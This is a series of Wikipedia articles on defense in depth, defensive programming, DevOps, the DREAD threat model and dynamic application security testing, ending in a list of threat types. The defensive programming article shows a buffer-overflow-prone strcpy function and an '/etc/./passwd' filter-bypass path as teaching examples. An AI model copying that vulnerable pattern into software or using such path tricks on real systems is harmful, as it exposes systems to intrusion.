Vulnerability scanners
Timed access control
Internet Security Awareness Training
Sandboxing
Intrusion detection systems (IDS)
Network[edit]
Firewalls (hardware or software)
Demilitarized zones (DMZ)
Virtual private network (VPN)
Physical[edit]
Biometrics
Data-centric security
Physical security (e.g. deadbolt locks)
Example[edit]
In the following scenario a web browser is developed using defense in depth -

the browser developers receive security training
the codebase is checked automatically using security analysis tools
the browser is regularly audited by an internal security team
... is occasionally audited by an external security team
... is executed inside a sandbox
See also[edit]
Defence-in-depth (Roman military)
Defense strategy (computing)
References[edit]


^ Schneier on Security: Security in the Cloud

^ "Some principles of secure design. Designing Secure Systems module Autumn PDF Free Download". docplayer.net. Retrieved 2020-12-12.

^ a b Defense in Depth: A practical strategy for achieving Information Assurance in today’s highly networked environments.

^ OWASP Wiki: Defense in depth

^ Stewart, James Michael; Chapple, Mike; Gibson, Darril (2015). CISSP (ISC)2 Certified Information Systems Security Professional Official Study Guide.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Defense_in_depth_(computing)&oldid=1104320010"
Categories: Computer network securityComputer security proceduresData securityHidden categories: Articles with short descriptionShort description is different from WikidataArticles needing additional references from April 2012All articles needing additional references
 



From Wikipedia, the free encyclopedia


Software development methodology


This article contains instructions, advice, or how-to content. The purpose of Wikipedia is to present facts, not to train. Please help improve this article either by rewriting the how-to content or by moving it to Wikiversity, Wikibooks or Wikivoyage. (March 2012)
Defensive programming is a form of defensive design intended to develop programs that are capable of detecting potential security abnormalities and make predetermined responses.[1] It ensures the continuing function of a piece of software under unforeseen circumstances. Defensive programming practices are often used where high availability, safety, or security is needed.
Defensive programming is an approach to improve software and source code, in terms of:

General quality – reducing the number of software bugs and problems.
Making the source code comprehensible – the source code should be readable and understandable so it is approved in a code audit.
Making the software behave in a predictable manner despite unexpected inputs or user actions.
Overly defensive programming, however, may safeguard against errors that will never be encountered, thus incurring run-time and maintenance costs. There is also a risk that code traps prevent too many exceptions, potentially resulting in unnoticed, incorrect results.


Secure programming[edit]
Main article: Secure coding
Secure programming is the subset of defensive programming concerned with computer security. Security is the concern, not necessarily safety or availability (the software may be allowed to fail in certain ways). As with all kinds of defensive programming, avoiding bugs is a primary objective; however, the motivation is not as much to reduce the likelihood of failure in normal operation (as if safety were the concern), but to reduce the attack surface – the programmer must assume that the software might be misused actively to reveal bugs, and that bugs could be exploited maliciously.

int risky_programming(char *input) {
  char str[1000]; 
  
  // ...
  
  strcpy(str, input);  // Copy input.
  
  // ...
}

The function will result in undefined behavior when the input is over 1000 characters. Some programmers may not feel that this is a problem, supposing that no user will enter such a long input. This particular bug demonstrates a vulnerability which enables buffer overflow exploits. Here is a solution to this example:

int secure_programming(char *input) {
  char str[1000+1];  // One more for the null character.

  // ...

  // Copy input without exceeding the length of the destination.
  strncpy(str, input, sizeof(str));

  // If strlen(input) >= sizeof(str) then strncpy won't null terminate. 
  // We counter this by always setting the last character in the buffer to NUL,
  // effectively cropping the string to the maximum length we can handle.
  // One can also decide to explicitly abort the program if strlen(input) is 
  // too long.
  str[sizeof(str) - 1] = '\0';

  // ...
}

Offensive programming[edit]
Main article: Offensive programming
Offensive programming is a category of defensive programming, with the added emphasis that certain errors should not be handled defensively. In this practice, only errors from outside the program's control are to be handled (such as user input); the software itself, as well as data from within the program's line of defense, are to be trusted in this methodology.

Trusting internal data validity[edit]
Overly defensive programming
const char* trafficlight_colorname(enum traffic_light_color c) {
    switch (c) {
        case TRAFFICLIGHT_RED:    return "red";
        case TRAFFICLIGHT_YELLOW: return "yellow";
        case TRAFFICLIGHT_GREEN:  return "green";
    }
    return "black"; // To be handled as a dead traffic light.
    // Warning: This last 'return' statement will be dropped by an optimizing
    // compiler if all possible values of 'traffic_light_color' are listed in
    // the previous 'switch' statement...
}

Offensive programming
const char* trafficlight_colorname(enum traffic_light_color c) {
    switch (c) {
        case TRAFFICLIGHT_RED:    return "red";
        case TRAFFICLIGHT_YELLOW: return "yellow";
        case TRAFFICLIGHT_GREEN:  return "green";
    }
    assert(0); // Assert that this section is unreachable.
    // Warning: This 'assert' function call will be dropped by an optimizing
    // compiler if all possible values of 'traffic_light_color' are listed in
    // the previous 'switch' statement...
}

Trusting software components[edit]
Overly defensive programming
if (is_legacy_compatible(user_config)) {
    // Strategy: Don't trust that the new code behaves the same
    old_code(user_config);
} else {
    // Fallback: Don't trust that the new code handles the same cases
    if (new_code(user_config) != OK) {
        old_code(user_config);
    }
}

Offensive programming
// Expect that the new code has no new bugs
if (new_code(user_config) != OK) {
    // Loudly report and abruptly terminate program to get proper attention
    report_error("Something went very wrong");
    exit(-1);
}

Techniques[edit]
Here are some defensive programming techniques:

Intelligent source code reuse[edit]
If existing code is tested and known to work, reusing it may reduce the chance of bugs being introduced.
However, reusing code is not always good practice. Reuse of existing code, especially when widely distributed, can allow for exploits to be created that target a wider audience than would otherwise be possible and brings with it all the security and vulnerabilities of the reused code.
When considering using existing source code, a quick review of the modules(sub-sections such as classes or functions) will help eliminate or make the developer aware of any potential vulnerabilities and ensure it is suitable to use in the project.[citation needed]

Legacy problems[edit]
Before reusing old source code, libraries, APIs, configurations and so forth, it must be considered if the old work is valid for reuse, or if it is likely to be prone to legacy problems.
Legacy problems are problems inherent when old designs are expected to work with today's requirements, especially when the old designs were not developed or tested with those requirements in mind.
Many software products have experienced problems with old legacy source code; for example:

Legacy code may not have been designed under a defensive programming initiative, and might therefore be of much lower quality than newly designed source code.
Legacy code may have been written and tested under conditions which no longer apply. The old quality assurance tests may have no validity any more.
Example 1: legacy code may have been designed for ASCII input but now the input is UTF-8.
Example 2: legacy code may have been compiled and tested on 32-bit architectures, but when compiled on 64-bit architectures, new arithmetic problems may occur (e.g., invalid signedness tests, invalid type casts, etc.).
Example 3: legacy code may have been targeted for offline machines, but becomes vulnerable once network connectivity is added.
Legacy code is not written with new problems in mind. For example, source code written in 1990 is likely to be prone to many code injection vulnerabilities, because most such problems were not widely understood at that time.
Notable examples of the legacy problem:

BIND 9, presented by Paul Vixie and David Conrad as "BINDv9 is a complete rewrite", "Security was a key consideration in design",[2] naming security, robustness, scalability and new protocols as key concerns for rewriting old legacy code.
Microsoft Windows suffered from "the" Windows Metafile vulnerability and other exploits related to the WMF format. Microsoft Security Response Center describes the WMF-features as "Around 1990, WMF support was added... This was a different time in the security landscape... were all completely trusted",[3] not being developed under the security initiatives at Microsoft.
Oracle is combating legacy problems, such as old source code written without addressing concerns of SQL injection and privilege escalation, resulting in many security vulnerabilities which have taken time to fix and also generated incomplete fixes. This has given rise to heavy criticism from security experts such as David Litchfield, Alexander Kornbrust, Cesar Cerrudo.[4][5][6] An additional criticism is that default installations (largely a legacy from old versions) are not aligned with their own security recommendations, such as Oracle Database Security Checklist, which is hard to amend as many applications require the less secure legacy settings to function correctly.
Canonicalization[edit]
Malicious users are likely to invent new kinds of representations of incorrect data. For example, if a program attempts to reject accessing the file "/etc/passwd", a cracker might pass another variant of this file name, like "/etc/./passwd". Canonicalization libraries can be employed to avoid bugs due to non-canonical input.

Low tolerance against "potential" bugs[edit]
Assume that code constructs that appear to be problem prone (similar to known vulnerabilities, etc.) are bugs and potential security flaws.  The basic rule of thumb is: "I'm not aware of all types of security exploits.  I must protect against those I do know of and then I must be proactive!".

Other Tips to Secure Your Code[edit]
One of the most common problems is unchecked use of constant-size or pre-allocated structures for dynamic-size data such as inputs to the program (the buffer overflow problem). This is especially common for string data in C. C library functions like gets should never be used since the maximum size of the input buffer is not passed as an argument. C library functions like scanf can be used safely, but require the programmer to take care with the selection of safe format strings, by sanitizing it before using it.
Encrypt/authenticate all important data transmitted over networks.  Do not attempt to implement your own encryption scheme, use a proven one instead. Message checking with CRC or similar technology will also help secure data sent over a network.
The 3 Rules of Data Security[edit]
 * All data is important until proven otherwise.
 * All data is tainted until proven otherwise.
 * All code is insecure until proven otherwise.

You cannot prove the security of any code in userland, or, more commonly known as: "never trust the client".
These three rules about data security describe how to handle any data, internally or externally sourced:
All data is important until proven otherwise - means that all data must be verified as garbage before being destroyed.
All data is tainted until proven otherwise   - means that all data must be handled in a way that does not expose the rest of the runtime environment without verifying integrity.
All code is insecure until proven otherwise  - while a slight misnomer, does a good job reminding us to never assume our code is secure as bugs or undefined behavior may expose the project or system to attacks such as common SQL injection attacks.

More Information[edit]
If data is to be checked for correctness, verify that it is correct, not that it is incorrect.
Design by contract
Assertions (also called assertive programming)
Prefer exceptions to return codes
Generally speaking, it is preferable to throw exception messages that enforce part of your API contract and guide the developer instead of returning error code values that do not point to where the exception occurred or what the program stack looked liked, Better logging and exception handling will increase robustness and security of your software, while minimizing developer stress.
See also[edit]
Computer security
Immunity-aware programming
References[edit]

^ Boulanger, Jean-Louis (2016-01-01),  Boulanger, Jean-Louis (ed.), "6 - Technique to Manage Software Safety", Certifiable Software Applications 1, Elsevier, pp. 125–156, ISBN 978-1-78548-117-8, retrieved 2022-09-02

^ "fogo archive: Paul Vixie and David Conrad on BINDv9 and Internet Security by Gerald Oskoboiny <gerald@impressive.net>". impressive.net. Retrieved 2018-10-27.

^ "Looking at the WMF issue, how did it get there?". MSRC. Archived from the original on 2006-03-24. Retrieved 2018-10-27.

^ Litchfield, David. "Bugtraq: Oracle, where are the patches???". seclists.org. Retrieved 2018-10-27.

^ Alexander, Kornbrust. "Bugtraq: RE: Oracle, where are the patches???". seclists.org. Retrieved 2018-10-27.

^ Cerrudo, Cesar. "Bugtraq: Re: [Full-disclosure] RE: Oracle, where are the patches???". seclists.org. Retrieved 2018-10-27.


External links[edit]
CERT Secure Coding Standards




Retrieved from "https://en.wikipedia.org/w/index.php?title=Defensive_programming&oldid=1127583817"
Categories: Programming paradigmsProgramming principlesHidden categories: Articles with short descriptionShort description is different from WikidataUse American English from November 2020All Wikipedia articles written in American EnglishArticles needing cleanup from March 2012All pages needing cleanupArticles containing how-to sectionsAll articles with unsourced statementsArticles with unsourced statements from November 2021
 




From Wikipedia, the free encyclopedia


This is the latest accepted revision, reviewed on 22 January 2023.



Set of software development practices

DevOps is a methodology in the software development and IT industry. Used as a set of practices and tools, DevOps integrates and automates the work of software development (Dev) and IT operations (Ops) as a means for improving and shortening the systems development life cycle.[1] DevOps is complementary to agile software development; several DevOps aspects came from the agile way of working.


Definition[edit]
Other than it being a cross-functional combination (and a portmanteau) of the terms and concepts for "development" and "operations", academics and practitioners have not developed a universal definition for the term "DevOps".[a][b][c][d] Most often, DevOps is characterized by key principles: shared ownership, workflow automation, and rapid feedback.
From an academic perspective, Len Bass, Ingo Weber, and Liming Zhu—three computer science researchers from the CSIRO and the Software Engineering Institute—suggested defining DevOps as "a set of practices intended to reduce the time between committing a change to a system and the change being placed into normal production, while ensuring high quality".[5]
However, the term is used in multiple contexts. At its most successful, DevOps is a combination of specific practices, culture change, and tools.[6]

History[edit]
This section is in list format but may read better as prose. You can help by converting this section, if appropriate. Editing help is available. (July 2022)
In 1993 the Telecommunications Information Networking Architecture Consortium (TINA-C) defined a Model of a Service Lifecycle that combined software development with (telecom) service operations.[7]
In 2009, the first conference named devopsdays was held in Ghent, Belgium. The conference was founded by Belgian consultant, project manager and agile practitioner Patrick Debois.[8][9] The conference has now spread to other countries.[10]
In 2012, the State of DevOps report was conceived and launched by Alanna Brown at Puppet.[11][12]
As of 2014, the annual State of DevOps report was published by Nicole Forsgren, Gene Kim, Jez Humble and others. They stated that the adoption of DevOps was accelerating.[13][14] Also in 2014, Lisa Crispin and Janet Gregory wrote the book More Agile Testing, containing a chapter on testing and DevOps.[15][16]
In 2016 the DORA metrics for throughput (deployment frequency, lead time for changes), and stability (mean time to recover, change failure rate) were published in the State of DevOps report.[11]

Relationship to other approaches[edit]
Many of the ideas fundamental to DevOps practices are inspired by, or mirror, other well known practices such as Lean and Deming's Plan-Do-Check-Act cycle, through to The Toyota Way and the Agile approach of breaking down components and batch sizes.[17] Contrary to the "top-down" proscriptive approach and rigid framework of ITIL in the 1990s, DevOps is "bottom-up" and a flexible practice, created by software engineers, with software engineer needs in mind.[18]

Agile[edit]
Main article: Agile software development
The motivations for what has become modern DevOps and several standard DevOps practices such as automated build and test, continuous integration, and continuous delivery originated in the Agile world, which dates (informally) to the 1990s, and formally to 2001. Agile development teams using methods such as extreme programming couldn't "satisfy the customer through early and continuous delivery of valuable software"[19] unless they subsumed the operations / infrastructure responsibilities associated with their applications, many of which they automated. Because Scrum emerged as the dominant Agile framework in the early 2000s and it omitted the engineering practices that were part of many Agile teams, the movement to automate operations / infrastructure functions splintered from Agile and expanded into what has become modern DevOps. Today, DevOps focuses on the deployment of developed software, whether it is developed using Agile oriented methodologies or other methodologies.

ArchOps[edit]
ArchOps presents an extension for DevOps practice, starting from software architecture artifacts, instead of source code, for operation deployment.[20] ArchOps states that architectural models are first-class entities in software development, deployment, and operations.

CI/CD[edit]
Main article: CI/CD
Automation is a core principle for achieving DevOps success and CI/CD is a critical component.[21] Plus, improved collaboration and communication between and within teams helps achieve faster time to market, with reduced risks.[22]

Site-reliability engineering[edit]
Main article: Site reliability engineering
In 2003, Google developed site reliability engineering (SRE), an approach for releasing new features continuously into large-scale high-availability systems while maintaining high-quality end-user experience.[23] While SRE predates the development of DevOps, they are generally viewed as being related to each other.

Toyota production system, lean thinking, kaizen[edit]
Main article: Toyota Production System
Toyota production system, also known under the acronym TPS, was the inspiration for lean thinking with its focus on continuous improvement, kaizen, flow and small batches. The andon cord principle to create fast feedback, swarm and solve problems stems from TPS.[24][25]

DevSecOps, shifting security left[edit]
DevSecOps is an augmentation of DevOps to allow for security practices to be integrated into the DevOps approach. Contrary to a traditional centralized security team model, each delivery team is empowered to factor in the correct security controls into their software delivery. Security practices and testing are performed earlier in the development lifecycle, hence the term "shift left" can be used. Security is tested in three main areas: static, software composition, and dynamic.
Checking the code statically via static application security testing (SAST) is white-box testing with special focus on security. Depending on the programming language, different tools are needed to do such static code analysis. The software composition is analyzed, especially libraries and their versions are checked against vulnerability lists published by CERT and other expert groups. When giving software to clients, licenses and its match to the one of the software distributed are in focus, especially copyleft licenses. Dynamic testing is also called black-box testing. The software is tested without knowing its inner functions. In DevSecOps it is on one hand called dynamically (DAST), or penetration testing. The goal is to catch, amongst others, errors like cross-site scripting, or SQL injection early. Threat types are for example published by the open web application security project, e.g. its TOP10.[26] On the other hand, especially with microservices interactive application testing (IAST) is helpful to check which code is executed when running automated functional tests, the focus is to detect vulnerabilities within the applications. Contrary to SAST and DAST, IAST works inside the application.
DevSecOps has also been described as a cultural shift involving a holistic approach to producing secure software by integrating security education, secure by design, and security automation.[27]

Cultural change[edit]
DevOps initiatives can create cultural changes in companies[28] by transforming the way operations, developers, and testers collaborate during the development and delivery processes.[29] Getting these groups to work cohesively is a critical challenge in enterprise DevOps adoption.[30][31] DevOps is as much about culture, as it is about the toolchain.[32]

Microservices[edit]
Although in principle it is possible to practice DevOps with any architectural style, the microservices architectural style is becoming the standard for building continuously deployed systems. Small size service allows the architecture of an individual service to emerge through continuous refactoring.[33]

DevOps automation[edit]
It also supports consistency, reliability, and efficiency within the organization, and is usually enabled by a shared code repository or version control. As DevOps researcher Ravi Teja Yarlagadda hypothesizes, "Through DevOps, there is an assumption that all functions can be carried out, controlled, and managed in a central place using a simple code."[34]

Automation with version control[edit]
Many organizations use version control to power DevOps automation technologies like virtual machines, containerization (or OS-level virtualization), and CI/CD. The paper "DevOps: development of a toolchain in the banking domain" notes that with teams of developers working on the same project, "All developers need to make changes to the same codebase and sometimes edit even the same files. For efficient working, there has to be a system that helps engineers avoid conflicts and retain the codebase history,"[35] with the Git version control system and the GitHub platform referenced as examples.

GitOps[edit]
This section needs expansion. You can help by adding to it.  (April 2022)
GitOps evolved from DevOps.[36][37][38] The specific state of deployment configuration is version-controlled. Because the most popular version-control is Git, GitOps approach has been named after Git.[39][40][41] Changes to configuration can be managed using code review practices, and can be rolled back using version-controlling.

See also[edit]
DataOps
DevOps toolchain
Twelve-factor app
Infrastructure as code
Lean software development
Value stream
Notes[edit]


^ Dyck et al. (2015) "To our knowledge, there is no uniform definition for the terms release engineering and DevOps. As a consequence, many people use their own definitions or rely on others, which results in confusion about those terms."[2]

^ Jabbari et al. (2016) "The research results of this study showed the need for a definition as individual studies do not consistently define DevOps."[3]

^ Erich et al. (2017) "We noticed that there are various gaps in the study of DevOps: There is no consensus of what concepts DevOps covers, nor how DevOps is defined."[4]

^ Erich et al. (2017) "We discovered that there exists little agreement about the characteristics of DevOps in the academic literature."[4]


References[edit]


^ Courtemanche, Meredith; Mell, Emily; Gills, Alexander S. "What Is DevOps? The Ultimate Guide". TechTarget. Retrieved 2023-01-22.

^ Dyck, Andrej; Penners, Ralf; Lichter, Horst (2015-05-19). "Towards Definitions for Release Engineering and DevOps". Proceedings of the 2015 IEEE/ACM 3rd International Workshop on Release Engineering. IEEE: 3. doi:10.1109/RELENG.2015.10. ISBN 978-1-4673-7070-7. S2CID 4659735.

^ Jabbari, Ramtin; bin Ali, Nauman; Petersen, Kai; Tanveer, Binish (May 2016). "What is DevOps?: A Systematic Mapping Study on Definitions and Practices". Proceedings of the 2016 Scientific Workshop. Association for Computing Machinery.

^ a b Erich, F.M.A.; Amrit, C.; Daneva, M. (June 2017). "A Qualitative Study of DevOps Usage in Practice". Journal of Software: Evolution and Process. 29 (6): e1885. doi:10.1002/smr.1885. S2CID 35914007.

^ Bass, Len; Weber, Ingo; Zhu, Liming (2015). DevOps: A Software Architect's Perspective. ISBN 978-0134049847.

^ Muñoz, Mirna; Negrete Rodríguez, Mario (April 2021). "A guidance to implement or reinforce a DevOps approach in organizations: A case study". {{cite journal}}: Cite journal requires |journal= (help)

^ Chapman, M., Gatti, N: A model of a service life cycle, Proceedings of TINA '93, pp. I-205–I-215, Sep., 1993.

^ Mezak, Steve (25 January 2018). "The Origins of DevOps: What's in a Name?". devops.com. Retrieved 6 May 2019.

^ Debois, Patrick (9 October 2008). "Agile 2008 Toronto". Just Enough Documented Information. Retrieved 12 March 2015.

^ Debois, Patrick. "DevOps Days". DevOps Days. Retrieved 31 March 2011.

^ a b Alana Brown; Nicole Forsgren; Jez Humble; Nigel Kersten; Gene Kim (2016). "2016 State of DevOps Report" (PDF). Puppet Labs, DORA (DevOps Research. Retrieved 2019-05-06.

^ "Puppet - Alanna Brown". Puppet Labs. Retrieved 2019-04-27.

^ Nicole Forsgren; Gene Kim; Nigel Kersten; Jez Humble (2014). "2014 State of DevOps Report" (PDF). Puppet Labs, IT Revolution Press and ThoughtWorks. Retrieved 2019-04-27.

^ "2015 State of DevOps Report" (PDF). Puppet Labs, Pwc, IT Revolution Press. 2015. Retrieved 2019-05-06.

^ "More Agile Testing" (PDF). October 2014. Retrieved 2019-05-06.

^ Crispin, Lisa; Gregory, Janet (October 2014). More Agile Testing. ISBN 9780133749571. Retrieved 2019-05-06.

^ Klein, Brandon Thorin (2021-05-01). "The DevOps: A Concise Understanding to the DevOps Philosophy and Science". doi:10.2172/1785164. OSTI 1785164. S2CID 236606284. {{cite journal}}: Cite journal requires |journal= (help)

^ "The History and Evolution of DevOps | Tom Geraghty". Retrieved 2020-11-29.

^ "Principles behind the Agile Manifesto". agilemanifesto.org. Retrieved 2020-12-06.

^ Castellanos, Camilo; Correal, Dario (15 September 2018). Executing Architectural Models for Big Data Analytics. Lecture Notes in Computer Science. Vol. 11048. pp. 364–371. doi:10.1007/978-3-030-00761-4_24. ISBN 978-3-030-00760-7.

^ Humble, Jez; Farley, David (2011). Continuous Delivery: reliable software releases through build, test, and deployment automation. Pearson Education Inc. ISBN 978-0-321-60191-9.

^ Chen, Lianping (2015). "Continuous Delivery: Huge Benefits, but Challenges Too". IEEE Software. 32 (2): 50–54. doi:10.1109/MS.2015.27. S2CID 1241241.

^ Beyer, Betsy; Jones, Chris; Petoff, Jennifer; Murphy, Niall Richard (April 2016). Site Reliability Engineering. O'Reilly Media. ISBN 978-1-4919-2909-4.

^ Analyzing the DNA of DevOps, Brent Aaron Reed, Willy Schaub, 2018-11-14.

^ The DevOps Handbook: How to Create World-Class Agility, Reliability, and Security in Technology Organizations, Gene Kim, Patrick Debois, John Willis, Jezz Humble, 2016

^ OWASP TOP10, Open web application security project, accessed 2021-11-25.

^ Wilson, Glenn (December 2020). 'DevSecOps: A leader's guide to producing secure software with compromising flow, feedback and continuous improvement'. Rethink Press. ISBN 978-1781335024.

^ Emerging Technology Analysis: DevOps a Culture Shift, Not a Technology (Report). Gartner.

^ Loukides, Mike (7 June 2012). "What is DevOps?". O'Reilly Media.

^ "Gartner IT Glossary – devops". Gartner. Retrieved 30 October 2015.

^ Jones, Stephen; Noppen, Joost; Lettice, Fiona (21 July 2016). Proceedings of the 2nd International Workshop on Quality-Aware Dev Ops - QUDOS 2016 (PDF). pp. 7–11. doi:10.1145/2945408.2945410. ISBN 9781450344111. S2CID 515140.

^ Mandi Walls (25 September 2015). "Building a DevOps culture". O'Reilly.

^ Chen, Lianping; Ali Babar, Muhammad (2014). "2014 IEEE/IFIP Conference on Software Architecture". The 11th Working IEEE/IFIP Conference on Software Architecture(WICSA 2014). IEEE. pp. 195–204. doi:10.1109/WICSA.2014.45. ISBN 978-1-4799-3412-6.

^ Teja Yarlagadda, Ravi (9 March 2021). "DevOps and Its Practices". SSRN 3798877.

^ Morisio, Maurizio (16 April 2021). DevOps: development of a toolchain in the banking domain. Politecnico di Torino (laurea). Retrieved 16 August 2021.

^ "Getting Started with GitOps". TheNewStack.io. 13 December 2021. Retrieved 5 April 2022.

^ "GitOps Workflows and Principles for Kubernetes". ContainerJournal.com. 1 April 2022. Retrieved 5 April 2022.

^ "Kubernetes at Scale without GitOps Is a Bad Idea". TheNewStack.io. 7 March 2022. Retrieved 5 April 2022.

^ "Top 5 Challenges in Modern Kubernetes Testing". TheNewStack.io. 11 March 2022. Retrieved 5 April 2022.

^ "The world's largest telcos are now embracing GitOps. Deutsche Telekom explains why".

^ "Can 'shift left' in DevOps pipelines go too far?". Techtarget.com. Retrieved 5 April 2022.


Further reading[edit]
Davis, Jennifer; Daniels, Ryn (2016-05-30). Effective DevOps : building a culture of collaboration, affinity, and tooling at scale. Sebastopol, CA: O'Reilly. ISBN 9781491926437. OCLC 951434424.
Kim, Gene; Debois, Patrick; Willis, John; Humble, Jez; Allspaw, John (2015-10-07). The DevOps handbook : how to create world-class agility, reliability, and security in technology organizations (First ed.). Portland, OR. ISBN 9781942788003. OCLC 907166314.
Forsgren, Nicole; Humble, Jez; Kim, Gene (27 March 2018). Accelerate: The Science of Lean Software and DevOps: Building and Scaling High Performing Technology Organizations (First ed.). IT Revolution Press. ISBN 9781942788331.
Retrieved from "https://en.wikipedia.org/w/index.php?title=DevOps&oldid=1135105758"
Categories: Agile software developmentSoftware development processInformation technology managementHidden categories: CS1 errors: missing periodicalArticles with short descriptionShort description is different from WikidataWikipedia pending changes protected pagesArticles needing cleanup from July 2022All pages needing cleanupArticles with sections that need to be turned into prose from July 2022Articles to be expanded from April 2022All articles to be expandedArticles using small message boxes
 



From Wikipedia, the free encyclopedia


DREAD is part of a system for risk-assessing computer security threats that was formerly used at Microsoft.[1] It provides a mnemonic for risk rating security threats using five categories.
The categories are:

Damage – how bad would an attack be?
Reproducibility – how easy is it to reproduce the attack?
Exploitability – how much work is it to launch the attack?
Affected users – how many people will be impacted?
Discoverability – how easy is it to discover the threat?
The DREAD name comes from the initials of the five categories listed. It was initially proposed for threat modeling but was abandoned when it was discovered that the ratings are not very consistent and are subject to debate. It was discontinued at Microsoft by 2008.[2]
When a given threat is assessed using DREAD, each category is given a rating from 1 to 10.[3] The sum of all ratings for a given issue can be used to prioritize among different issues.


Discoverability debate[edit]
Some security experts feel that including the "Discoverability" element as the last D rewards security through obscurity, so some organizations have either moved to a DREAD-D "DREAD minus D" scale (which omits Discoverability) or always assume that Discoverability is at its maximum rating.[4][5]

See also[edit]
Cyber security and countermeasure
STRIDE – another mnemonic for security threats
References[edit]


^ Shostack, Adam. "Experiences Threat Modeling at Microsoft" (PDF).

^ "Do you use DREAD as it is?". Archived from the original on 2016-03-06. Retrieved 2014-09-08.

^ "Security/OSSA-Metrics - OpenStack". wiki.openstack.org.

^ "Security/OSSA-Metrics - OpenStack". wiki.openstack.org.

^ "Threat Modeling | OWASP". owasp.org.


External links[edit]
Improving Web Application Security: Threats and Countermeasures
DREADful, an MSDN blog post
Experiences Threat Modeling at Microsoft, Adam Shostack


This computer security article is a stub. You can help Wikipedia by expanding it.vte




Retrieved from "https://en.wikipedia.org/w/index.php?title=DREAD_(risk_assessment_model)&oldid=1095844642"
Categories: Computer securityComputer security stubsHidden categories: All stub articles
 



From Wikipedia, the free encyclopedia


A dynamic application security testing (DAST) is a non functional testing process where one can assess an application using certain techniques and the end result of such testing process covers security weaknesses and vulnerabilities present in an application. This testing process can be carried out either in manual way or by using automated tools. Manual assessment of an application involves a more human intervention to identify the security flaws which might slip from an automated tool. Usually business logic errors, race condition checks, and certain zero day vulnerabilities can only be identified using manual assessments. On the other side, a DAST tool is a program which communicates with a web application through the web front-end in order to identify potential security vulnerabilities in the web application and architectural weaknesses.[1] It performs a black-box test. Unlike static application security testing tools, DAST tools do not have access to the source code and therefore detect vulnerabilities by actually performing attacks.
DAST tools allow sophisticated scans, detecting vulnerabilities with minimal user interactions once configured with host name, crawling parameters and authentication credentials. These tools will attempt to detect vulnerabilities in query strings, headers, fragments, verbs (GET/POST/PUT) and DOM injection.


Overview[edit]
DAST tools facilitate the automated review of a web application with the express purpose of discovering security vulnerabilities and are required to comply with various regulatory requirements. Web application scanners can look for a wide variety of vulnerabilities, such as input/output validation: (e.g. cross-site scripting and SQL injection), specific application problems and server configuration mistakes.
In a copyrighted report published in March 2012 by security vendor Cenzic, the most common application vulnerabilities in recently tested applications include:[2]



37%
Cross-site scripting


16%
SQL injection


5%
Path disclosure


5%
Denial-of-service


4%
Code execution


4%
Memory corruption


4%
Cross-site request forgery


3%
Information disclosure


3%
Arbitrary file


2%
Local file inclusion


1%
Remote file inclusion


1%
Buffer overflow


15%
Other (PHP injection, Javascript injection, etc.)

Commercial and open-source scanners[edit]
Commercial scanners are a category of web-assessment tools which need to be purchased. Some scanners include some free features but most need to be bought for full access to the tool's power.
Open-source scanners are often free of cost to the user.
Security researcher Shay Chen has previously compiled an exhaustive list of both commercial and open-source web application security scanners.[3] The list also highlights how each of the scanners performed during his benchmarking tests against the WAVSEP.
The WAVSEP platform is publicly available and can be used to evaluate the various aspects of web application scanners: technology support, performance, accuracy, coverage and result consistency.[4]

DAST strengths[edit]
These tools can detect vulnerabilities of the finalized release candidate versions prior to shipping. Scanners simulate a malicious user by attacking and probing, identifying results which are not part of the expected result set, allowing for a realistic attack simulation.[5] The big advantage of these types of tools are that they can scan year-round to be constantly searching for vulnerabilities. With new vulnerabilities being discovered regularly this allows companies to find and patch vulnerabilities before they can become exploited.[6]
As a dynamic testing tool, web scanners are not language-dependent. A web application scanner is able to scan engine-driven web applications. Attackers use the same tools, so if the tools can find a vulnerability, so can attackers.

DAST weaknesses[edit]
While scanning with a DAST tool, data may be overwritten or malicious payloads injected into the subject site. Sites should be scanned in a production-like but non-production environment to ensure accurate results while protecting the data in the production environment.
Because the tool is implementing a dynamic testing method, it cannot cover 100% of the source code of the application and then, the application itself. The penetration tester should look at the coverage of the web application or of its attack surface to know if the tool was configured correctly or was able to understand the web application.
The tool cannot implement all variants of attacks for a given vulnerability. So the tools generally have a predefined list of attacks and do not generate the attack payloads depending on the tested web application. Some tools are also quite limited in their understanding of the behavior of applications with dynamic content such as JavaScript and Flash.
A report from 2012 found that the top application technologies overlooked by most Web application scanners includes jQuery, REST, and Google WebToolkit in AJAX applications, Flash Remoting (AMF) and HTML5, as well as mobile apps and Web Services using JSON and REST. XML-RPC and SOAP technologies used in Web services, and complex workflows such as shopping cart, and XSRF/CSRF tokens.[7]
[8]

References[edit]


^ Web Application Security Scanner Evaluation Criteria version 1.0, WASC, 2009

^ "2012 Trends Report: Application Security Risks". Cenzic, Inc. 11 March 2012. Archived from the original on 17 December 2012. Retrieved 9 July 2012.

^ Comparison of Cloud & On-Premises Web Application Security Scanning Solutions. SecToolMarket.com Retrieved 2017-03-17

^ WAVSEP Platform Retrieved 2017-03-17

^ "SAST vs DAST". G2 Research Hub. Archived from the original on 2020-05-03.

^ "The Importance of Regular Vulnerability Scanning". AppCheck Ltd. Archived from the original on 2020-08-06.

^ Web Application Scanners Challenged By Modern Web Technologies. SecurityWeek.Com (2012-10-25). Retrieved on 2014-06-10.

^ Web Application Security Testing Retrieved 2020-11-04


External links[edit]
Web Application Security Scanner Evaluation Criteria from the Web Application Security Consortium (WASC)
Web Application Scanners, operated by the NIST
Challenges faced by automated web application security assessment from Robert Auger
The WASC security scanner list




Retrieved from "https://en.wikipedia.org/w/index.php?title=Dynamic_application_security_testing&oldid=1111134545"
Categories: Security testingDynamic program analysis
 



From Wikipedia, the free encyclopedia


Compromising a computer system
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

